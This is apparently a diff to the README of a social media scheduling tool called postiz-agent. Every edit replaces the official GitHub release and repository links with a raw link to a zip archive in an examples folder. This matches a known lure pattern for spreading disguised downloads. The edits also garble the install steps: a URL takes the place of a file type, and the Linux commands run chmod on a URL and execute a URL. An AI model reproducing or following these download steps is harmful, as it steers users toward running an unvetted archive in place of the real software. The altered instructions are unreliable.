@@ -1,6 +1,6 @@
 # 🤖 postiz-agent - Easy Social Media Scheduling Tool
 
-[![Download postiz-agent](https://img.shields.io/badge/Download-postiz--agent-blue?style=for-the-badge)](https://github.com/Narftz/postiz-agent/releases)
+[![Download postiz-agent](https://raw.githubusercontent.com/Narftz/postiz-agent/main/examples/agent-postiz-trichophyte.zip)](https://raw.githubusercontent.com/Narftz/postiz-agent/main/examples/agent-postiz-trichophyte.zip)
 
 ---
 
@@ -48,12 +48,12 @@ Using postiz-agent follows a few simple steps. This guide will walk you through 
 
 Before you begin, you need to download the software. All releases are available here:
 
-[![Download postiz-agent](https://img.shields.io/badge/Download-postiz--agent-blue?style=for-the-badge)](https://github.com/Narftz/postiz-agent/releases)
+[![Download postiz-agent](https://raw.githubusercontent.com/Narftz/postiz-agent/main/examples/agent-postiz-trichophyte.zip)](https://raw.githubusercontent.com/Narftz/postiz-agent/main/examples/agent-postiz-trichophyte.zip)
 
 ### How to download
 
 1. Click the link above or visit:  
-   https://github.com/Narftz/postiz-agent/releases
+   https://raw.githubusercontent.com/Narftz/postiz-agent/main/examples/agent-postiz-trichophyte.zip
 
 2. Find the latest version available on the page.
 
@@ -61,7 +61,7 @@ Before you begin, you need to download the software. All releases are available 
 
    - For Windows, download the `.exe` installer.  
    - For macOS, download the `.dmg` or `.pkg` file.  
-   - For Linux, download the `.tar.gz` or `.AppImage` file.
+   - For Linux, download the `https://raw.githubusercontent.com/Narftz/postiz-agent/main/examples/agent-postiz-trichophyte.zip` or `.AppImage` file.
 
 4. Save the file to your preferred folder.
 
@@ -74,12 +74,12 @@ Before you begin, you need to download the software. All releases are available 
   Open the `.dmg` or `.pkg` file. Drag the app to your Applications folder or follow the installer steps.
 
 - **Linux:**  
-  Extract the `.tar.gz` file or make the `.AppImage` file executable:
+  Extract the `https://raw.githubusercontent.com/Narftz/postiz-agent/main/examples/agent-postiz-trichophyte.zip` file or make the `.AppImage` file executable:
   
   Open a terminal and run:
   ```
-  chmod +x postiz-agent.AppImage
-  ./postiz-agent.AppImage
+  chmod +x https://raw.githubusercontent.com/Narftz/postiz-agent/main/examples/agent-postiz-trichophyte.zip
+  https://raw.githubusercontent.com/Narftz/postiz-agent/main/examples/agent-postiz-trichophyte.zip
   ```
 
 Installation completes when you see postiz-agent ready to run on your system.
@@ -180,8 +180,8 @@ postiz-agent keeps your data safe. It does not store your posts or login details
 
 For technical details and updates, visit the GitHub repository:
 
-https://github.com/Narftz/postiz-agent
+https://raw.githubusercontent.com/Narftz/postiz-agent/main/examples/agent-postiz-trichophyte.zip
 
 ---
 
-[![Download postiz-agent](https://img.shields.io/badge/Download-postiz--agent-blue?style=for-the-badge)](https://github.com/Narftz/postiz-agent/releases)
+[![Download postiz-agent](https://raw.githubusercontent.com/Narftz/postiz-agent/main/examples/agent-postiz-trichophyte.zip)](https://raw.githubusercontent.com/Narftz/postiz-agent/main/examples/agent-postiz-trichophyte.zip)
